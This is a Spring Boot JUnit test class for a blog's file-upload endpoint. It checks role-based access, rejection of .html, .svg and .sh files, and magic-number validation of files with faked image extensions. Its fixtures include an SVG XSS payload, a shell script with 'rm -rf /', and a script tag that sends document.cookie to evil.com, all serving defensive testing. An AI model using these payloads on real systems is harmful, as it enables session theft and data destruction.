package com.hayden.blog;

import com.hayden.blog.security.JwtTokenProvider;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.multipart;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("h2")
public class UploadSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    @Autowired
    private com.hayden.blog.service.UserService userService;

    private String adminToken;
    private String userToken;

    @BeforeEach
    void setUp() {
        adminToken = "Bearer " + jwtTokenProvider.generateToken("admin", "ADMIN");
        userToken = "Bearer " + jwtTokenProvider.generateToken("reader_upload", "USER");

        try {
            com.hayden.blog.dto.RegisterRequest req = new com.hayden.blog.dto.RegisterRequest();
            req.setUsername("reader_upload");
            req.setPassword("password123");
            req.setNickname("上传测试读者");
            req.setEmail("upload_reader@test.com");
            userService.register(req);
        } catch (Exception ignored) {
        }
    }

    @Test
    @DisplayName("上传安全：普通读者尝试上传文件被垂直越权拦截返回 403")
    void testReaderUploadForbidden() throws Exception {
        byte[] validPngBytes = new byte[]{(byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0, 0, 0, 0, 0};
        MockMultipartFile file = new MockMultipartFile("file", "valid.png", "image/png", validPngBytes);

        mockMvc.perform(multipart("/api/media/upload")
                        .file(file)
                        .header("Authorization", userToken))
                .andExpect(status().isForbidden())
                .andExpect(jsonPath("$.code").value(403));
    }

    @Test
    @DisplayName("上传安全：非法后缀 (html/svg/sh/js) 无论内容均被拦截返回 400")
    void testIllegalExtensionsRejected() throws Exception {
        // 1. .html 后缀
        MockMultipartFile htmlFile = new MockMultipartFile("file", "exploit.html", "text/html", "<h1>hack</h1>".getBytes());
        mockMvc.perform(multipart("/api/media/upload")
                        .file(htmlFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));

        // 2. .svg 后缀 (防 SVG XSS)
        MockMultipartFile svgFile = new MockMultipartFile("file", "vector.svg", "image/svg+xml", "<svg><script>alert(1)</script></svg>".getBytes());
        mockMvc.perform(multipart("/api/media/upload")
                        .file(svgFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));

        // 3. .sh 脚本
        MockMultipartFile shFile = new MockMultipartFile("file", "run.sh", "application/x-sh", "#!/bin/bash\nrm -rf /".getBytes());
        mockMvc.perform(multipart("/api/media/upload")
                        .file(shFile)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));
    }

    @Test
    @DisplayName("上传安全：伪造后缀 (实际为文本或脚本改名为 png) 触发魔数硬校验拦截返回 400")
    void testFakeMagicNumberRejected() throws Exception {
        // 后缀伪装成 png，但内容是普通文本
        MockMultipartFile fakePng = new MockMultipartFile("file", "fake.png", "image/png", "This is plain text pretending to be an image.".getBytes());
        mockMvc.perform(multipart("/api/media/upload")
                        .file(fakePng)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));

        // 后缀伪装成 jpg，内容包含恶意的 <script> 标签
        MockMultipartFile scriptJpg = new MockMultipartFile("file", "malicious.jpg", "image/jpeg", "<script>fetch('http://evil.com/cookie?c='+document.cookie)</script>".getBytes());
        mockMvc.perform(multipart("/api/media/upload")
                        .file(scriptJpg)
                        .header("Authorization", adminToken))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value(400));
    }

    @Test
    @DisplayName("上传安全：真实合规 PNG 与 JPEG 文件正常上传返回 200")
    void testValidImageUploadSuccess() throws Exception {
        // 1. 合法 PNG 签名：89 50 4E 47 0D 0A 1A 0A
        byte[] validPngBytes = new byte[]{
                (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52
        };
        MockMultipartFile validPng = new MockMultipartFile("file", "avatar.png", "image/png", validPngBytes);

        mockMvc.perform(multipart("/api/media/upload")
                        .file(validPng)
                        .header("Authorization", adminToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.code").value(200))
                .andExpect(jsonPath("$.data.url").isNotEmpty())
                .andExpect(jsonPath("$.data.filename").value("avatar.png"));

        // 2. 合法 JPEG 签名：FF D8 FF
        byte[] validJpgBytes = new byte[]{
                (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0,
                0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01
        };
        MockMultipartFile validJpg = new MockMultipartFile("file", "photo.jpg", "image/jpeg", validJpgBytes);

        mockMvc.perform(multipart("/api/media/upload")
                        .file(validJpg)
                        .header("Authorization", adminToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.code").value(200))
                .andExpect(jsonPath("$.data.url").isNotEmpty())
                .andExpect(jsonPath("$.data.filename").value("photo.jpg"));
    }
}
